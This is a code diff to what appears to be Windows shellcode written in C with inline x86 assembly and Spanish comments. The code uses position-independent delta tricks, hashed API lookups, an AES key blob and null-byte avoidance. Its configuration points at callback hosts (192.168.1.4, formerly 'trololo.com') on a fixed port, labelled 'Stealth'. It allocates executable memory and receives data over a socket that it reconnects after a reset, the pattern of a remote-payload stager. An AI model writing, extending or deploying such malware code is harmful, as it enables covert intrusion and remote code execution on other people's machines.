@@ -13,6 +13,7 @@ INCLUDE_PYSRC(..\..\builder\intrabuilder.py)
 #define STACKSIZE(...) PYTHON_FUNCTION()
 #define MY_CONFIG(...) PYTHON_FUNCTION()
 #define DEBUG_MSG(...) PYTHON_FUNCTION()
+#define _EMIT_ARRAY(...) PYTHON_FUNCTION()
 
 //No queremos que muestre el warning de etiqueta sin referencia, 
 //ya que las usamos para mejorar la legibilidad del código
@@ -27,6 +28,9 @@ INCLUDE_PYSRC(..\..\builder\intrabuilder.py)
 #include <stdio.h>
 
 DEFINE_PYSRC(
+def _EMIT_ARRAY(a):
+    return EMIT_ARRAY(a)
+
 def MY_CONFIG():
     blob = aes128Blob(bType    = PLAINTEXTKEYBLOB,
                       bVersion = CUR_BLOB_VERSION,
@@ -37,8 +41,8 @@ def MY_CONFIG():
 
     b = Builder()
     b.addBlob(blob)
-    b.addString("")
-    b.addTargets([[0x932B, "trololo.com"], [0x932B, "127.0.0.1"]])
+    b.addString("Stealth")
+    b.addTargets([[0x932B, "192.168.1.4"], [0x932B, "127.0.0.1"]])
     b.addDword(0)
     b.addDword(0)
     b.padd()
@@ -81,9 +85,7 @@ find_delta:
         */
         fldln2
 #ifdef SC_DELTA
-        EMIT_BYTE_ARRAY(
-            (0xD9) (0x74) (0x24) (0xF4)    //fstenv (28-BYTE) PTR SS:[esp-0x0C]
-        )
+        _EMIT_ARRAY([0xD9, 0x74, 0x24, 0xF4])
         pop  edi
         #ifdef SC_NULL
         add  edi, K
@@ -95,7 +97,7 @@ find_delta:
 #endif //SC_DELTA
 
         //Saltamos los hashes y funciones.
-        jmp  over_fncnhashes
+        jmp  over_hashes
     }
 #pragma region constantes
         /*###############################################################################
@@ -160,6 +162,8 @@ advapi32_symbol_hashes:
 
 //¡¡¡¡CONSTANTES TEMPORALES!!!!
     __asm{
+over_hashes:
+        jmp over_fncs
         /*###############################################################################
         ** Subrutina que copia de ESI a EDI pasando 
         ** de UNICODE a ASCII hasta encontrar el caracter que haya en DL
@@ -231,7 +235,7 @@ CreateBuff:
         call gtfo                       //>(EAX!=0)? No ha habido error, tenemos donde guardar los datos
 #endif //ERR_CHECK
         ret
-over_fncnhashes:
+over_fncs:
         //Saltamos sobre la configuración
         jmp  to_start
     }
@@ -572,7 +576,7 @@ _cont:  xor  eax, eax                   //EAX = 0
         mov  ah, 0x50                   //EAX = BUFF_SIZE
         cdq                             //EDX= 0
         push PAGE_EXECUTE_READWRITE     //v
-        push MEM_COMMIT | MEM_RESERVE   //v
+        pushc(MEM_COMMIT | MEM_RESERVE) //v
         push eax                        //v
         push edx                        //v
         call [ebp+_VirtualAlloc]        //> VirtualAlloc(0, BUFF_SIZE, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
@@ -710,7 +714,12 @@ recibir:
 KillSocket:
         DEBUG_MSG("sRESET")
         push [ebp+_hSocket]             //v
+#ifdef SC_NULL
+        mov  eax, ebp
+        call [eax]
+#else
         call [ebp+_closesocket]         //>closesocket(hSocket);
+#endif
         jmp  newSocket                  //Creamos un nuevo socket
 
         /*###############################################################################
